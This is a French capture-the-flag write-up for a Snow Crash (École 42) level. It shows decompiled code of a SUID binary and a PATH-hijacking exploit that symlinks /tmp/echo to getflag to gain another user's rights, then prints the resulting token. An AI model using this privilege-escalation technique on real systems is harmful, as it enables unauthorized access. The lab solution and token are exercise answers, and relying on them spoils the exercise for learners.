# Level 03 – Snow Crash – École 42

## 🎯 Objectif
Exploiter un binaire `level03` pour obtenir les droits de l’utilisateur `flag03` et récupérer le flag via `getflag`.

---

## 📄 Analyse des fichiers

Contenu du répertoire `/home/user/level03/` :
```
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

Le binaire `level03` est **exécutable avec les permissions SUID**, ce qui signifie qu’il s’exécute avec les droits de `flag03`.

---

## 🔍 Étapes d'analyse

### 1. 🔁 Récupération du binaire
On copie le binaire en local pour l’analyser avec un outil de reverse engineering comme **Ghidra** :
```bash
scp -P 4242 level03@localhost:/home/user/level03/level03 ./
```

### 2. 🧠 Résultat de l’analyse Ghidra

```c
int main(int argc,char **argv,char **envp) {
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  gid_t gid;
  uid_t uid;

  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  iVar1 = system("/usr/bin/env echo Exploit me");
  return iVar1;
}
```

Ce code appelle la commande :
```bash
/usr/bin/env echo Exploit me
```
Ce qui signifie que **la commande `echo` est trouvée dans le `$PATH`**, et exécutée.

---

## 💥 Exploitation

Le binaire utilise `env` pour lancer `echo`, donc on peut :
1. Créer un faux `echo` dans `/tmp` qui redirige vers `getflag`
2. Modifier le `$PATH` pour pointer en priorité vers `/tmp`

### Commandes :
```bash
ln -sf /bin/getflag /tmp/echo
export PATH=/tmp:$PATH
./level03
```

---

## ✅ Flag obtenu

```
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

---

## 🧠 Leçon retenue

> Lorsqu’un binaire SUID utilise une commande shell avec `env` ou dépend du `$PATH`,  
> **il est souvent possible d’injecter une commande personnalisée** si l’environnement n’est pas correctement verrouillé.

---

## 📁 Fichiers

- `flag` : contient le flag obtenu
- `ressources/` : contient ce `README.md` + binaire analysé (localement)
